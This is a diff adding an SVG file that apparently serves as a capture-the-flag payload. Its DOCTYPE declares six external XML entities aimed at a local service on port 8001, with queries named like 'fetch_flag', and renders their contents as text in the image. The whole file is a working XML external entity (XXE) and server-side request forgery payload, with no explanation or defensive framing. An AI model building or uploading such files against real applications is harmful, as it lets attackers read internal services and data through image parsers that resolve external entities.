@@ -1,0 +1,18 @@
+<?xml version="1.0"?>
+<!DOCTYPE svg [
+  <!ENTITY e1 SYSTEM "http://localhost:8001/search?q=fetch_flag.svg">
+  <!ENTITY e2 SYSTEM "http://localhost:8001/search?q=fetch_flag2.svg">
+  <!ENTITY e3 SYSTEM "http://localhost:8001/search?q=fetch_flag3.svg">
+  <!ENTITY e4 SYSTEM "http://localhost:8001/search?q=fetch_flag_final.svg">
+  <!ENTITY e5 SYSTEM "http://localhost:8001/search?q=zak-xsss.svg">
+  <!ENTITY e6 SYSTEM "http://localhost:8001/search?q=svg.svg">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="800" height="600">
+  <rect width="100%" height="100%" fill="#fff"/>
+  <text x="10" y="20" font-size="12" fill="black">&e1;</text>
+  <text x="10" y="40" font-size="12" fill="black">&e2;</text>
+  <text x="10" y="60" font-size="12" fill="black">&e3;</text>
+  <text x="10" y="80" font-size="12" fill="black">&e4;</text>
+  <text x="10" y="100" font-size="12" fill="black">&e5;</text>
+  <text x="10" y="120" font-size="12" fill="black">&e6;</text>
+</svg>
